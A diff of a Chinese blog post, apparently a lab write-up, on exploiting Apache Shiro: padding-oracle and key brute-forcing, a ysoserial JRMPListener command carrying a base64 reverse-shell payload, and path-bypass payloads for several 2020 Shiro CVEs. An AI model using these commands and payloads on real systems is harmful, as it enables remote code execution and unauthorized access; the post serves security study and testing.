-<h4 id="DNS方式："><a href="#DNS方式：" class="headerlink" title="DNS方式："></a>DNS方式：</h4><p>靶场平台：<a target="_blank" rel="noopener" href="https://vulfocus.cn/#/dashboard">https://vulfocus.cn/#/dashboard</a></p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/41.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p>爆破得到新的、符合填充的恶意内容的 base64（可能时间较长）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 shiro_exp.py &quot;url&quot; &quot;正常的cookie密文&quot; poc.ser</span><br></pre></td></tr></table></figure>
 
-<p>我们使用工具 命令：</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/42.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/20.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
-<p>得到了5个链子  我们这里使用第三个</p>
-<p>输入DNS的http域名  成功回显</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/43.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<h3 id="类型三：爆破密钥漏洞"><a href="#类型三：爆破密钥漏洞" class="headerlink" title="类型三：爆破密钥漏洞"></a>类型三：爆破密钥漏洞</h3><p><strong>版本：</strong> 全版本</p>
+<p><strong>条件：</strong> 密钥在爆破字典中</p>
+<p><strong>原理：</strong> 在讨论算法中其实很清楚知道，无论 AES-CBC 还是 AES-GCM 的加解密算法都是公开已知的。而解密时需要的两个变量 IV 和 Key，解密时服务器是使用 Cookie 中提取的 IV，所以也就只存在一个<strong>变量 Key</strong>。所以如果幸运的话爆破出密钥，就可以直接构造恶意内容。</p>
+<h3 id="类型四：对于-shiro-有密钥但是不回显的形式"><a href="#类型四：对于-shiro-有密钥但是不回显的形式" class="headerlink" title="类型四：对于 shiro 有密钥但是不回显的形式"></a>类型四：对于 shiro 有密钥但是不回显的形式</h3><p>（利用方式：DNS、JRMPC）</p>
+<p>工具：<a target="_blank" rel="noopener" href="https://github.com/wyzxxz/shiro_rce_tool">https://github.com/wyzxxz/shiro_rce_tool</a></p>
+<h4 id="DNS-方式"><a href="#DNS-方式" class="headerlink" title="DNS 方式"></a>DNS 方式</h4><p>靶场平台：<a target="_blank" rel="noopener" href="https://vulfocus.cn/#/dashboard">https://vulfocus.cn/#/dashboard</a></p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/21.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
-<h4 id="JRMPC方式："><a href="#JRMPC方式：" class="headerlink" title="JRMPC方式："></a>JRMPC方式：</h4><p>使用工具上面说的有： ysoserial-all.jar</p>
-<p>我们首先base64一下反弹shell的命令</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/44.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p>我们使用工具，命令：</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/22.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+
+<p>得到了 5 个链子，我们这里使用第三个。</p>
+<p>输入 DNS 的 http 域名，成功回显：</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/23.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+
+<h4 id="JRMPC-方式"><a href="#JRMPC-方式" class="headerlink" title="JRMPC 方式"></a>JRMPC 方式</h4><p>使用工具上面说的有：<code>ysoserial-all.jar</code></p>
+<p>我们首先 base64 一下反弹 shell 的命令：</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/24.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
 <p>服务器执行：</p>
-<p>java -jar ysoserial-all.jar ysoserial.exploit.JRMPListener 1388 CommonsCollections2 “bash -c {echo,反弹shell的命令的base64编码}|{base64,-d}|{bash,-i}”</p>
-<p>然后我们选择3  放上服务器ip:端口  这里我的是1388</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/45.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar ysoserial.exploit.JRMPListener 1388 CommonsCollections2 &quot;bash -c &#123;echo,反弹shell的命令的base64编码&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们选择 3，放上服务器 ip:端口，这里我的是 1388：</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/25.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
 <p>这个时候服务器收到了探测信息：</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/46.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/26.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
-<p>这个时候  因为我是反弹的shell且端口是1999  所以我又开启了一个端口 1999  成功拿到shell</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/47.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p>这个时候，因为我是反弹的 shell 且端口是 1999，所以我又开启了一个端口 1999，成功拿到 shell：</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/27.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
-<p>也是拿到了答案</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/48.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p>也是拿到了答案：</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/28.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
+<h2 id="shiro-权限绕过"><a href="#shiro-权限绕过" class="headerlink" title="shiro 权限绕过"></a>shiro 权限绕过</h2><p>（因为这些都是拼接路径的操作，就直接放上总结了）</p>
+<h3 id="CVE-2020-1957"><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h3><p><strong>影响版本：</strong> Shiro &lt; 1.5.2，Spring 框架中只使用了 Shiro 鉴权</p>
+<p><strong>POC：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/xxx/..;/admin/ctfer   (只适用于 Spring 低版本 &lt; 2.3)</span><br><span class="line">or</span><br><span class="line">/;/admin/ctfer         (只适用于 Spring 低版本 &lt; 2.3)</span><br><span class="line">or</span><br><span class="line">/admin;/ctfer          (Spring 全版本)</span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞说明：</strong> Spring 与 Shiro 对于 <code>/</code> 和 <code>;</code> 处理差异导致绕过。</p>
+<h3 id="CVE-2020-11989"><a href="#CVE-2020-11989" class="headerlink" title="CVE-2020-11989"></a>CVE-2020-11989</h3><p><strong>影响版本：</strong> Shiro &lt; 1.5.3，Spring 框架只使用了 Shiro 鉴权</p>
+<p><strong>POC：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/admin/a%25%32%66a or /admin/a%252fa -&gt; /admin/a%2fa</span><br><span class="line">- Apache Shiro = 1.5.2，且 controller 需为类似 `/hello/&#123;page&#125;` 的方式</span><br><span class="line">- 需要项目部署时 ContextPath 不是根目录（这里 ContextPath 为 context）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/;/context/admin/user   （正常的是 /admin/user）</span><br><span class="line">- Apache Shiro &lt; 1.5.3，且 server.servlet.context-path 不为根 /</span><br><span class="line">- getContextPath 获取部署目录为未处理 ;，导致和前面一样的原因</span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞说明：</strong> Spring 会一直解码到最终，但是 Shiro 只会解码一次。</p>
+<h3 id="CVE-2020-13933"><a href="#CVE-2020-13933" class="headerlink" title="CVE-2020-13933"></a>CVE-2020-13933</h3><p><strong>影响版本：</strong> Shiro &lt; 1.6.0，Spring 框架只使用 Shiro 鉴权</p>
+<p><strong>POC：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/%3bctfer</span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞原因：</strong> <code>getServletPath()</code> 获取问题，导致 <code>;</code> 截断。</p>
+<h3 id="CVE-2020-17523"><a href="#CVE-2020-17523" class="headerlink" title="CVE-2020-17523"></a>CVE-2020-17523</h3><p><strong>影响版本：</strong></p>
+<ul>
+<li>Apache Shiro &lt; 1.7.1</li>
+<li>Spring 框架只使用 Shiro 鉴权</li>
+</ul>
+<p><strong>POC：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/admin/%20</span><br><span class="line"></span><br><span class="line">%20 可替换为 %08、%09、%0a、%0d 等其他 trim 可删除的空白字符，但有时不成功，因为 SpringBoot + Tomcat 可能会 400。</span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞原因：</strong></p>
+<ul>
+<li><code>/admin</code> 正常，<code>/admin/</code> 可以越权</li>
+<li>ant 匹配规则处理不当，不必要的 trim 导致绕过匹配（trim 去掉空白字符导致 <code>/admin/%20</code> 解析为 <code>/admin/</code>）</li>
+</ul>
 
 	</div>
 
@@ -868,7 +893,8 @@
 	socialShare("#share", {
 	    title : 'shiro框架的加密分析和总结',
 	    description : `
-前言：在平时测一些站点的时候，几乎都会有登录框或者一些权限存在区分的地方，在这些地方大部分又是使用...`,
+对于 shiro 框架的漏洞，我们本篇分为反序列化与权限绕过来阐述
+首先什么是 shiro 框架呢...`,
 	    wechatQrcodeTitle : "分享到微信",
 	    wechatQrcodeHelper : '微信扫描二维码',
 	    source : 'https://wb-ldong.github.io/2026/10/22/shiro%E6%A1%86%E6%9E%B6%E7%9A%84%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90%E5%92%8C%E6%80%BB%E7%BB%93/'
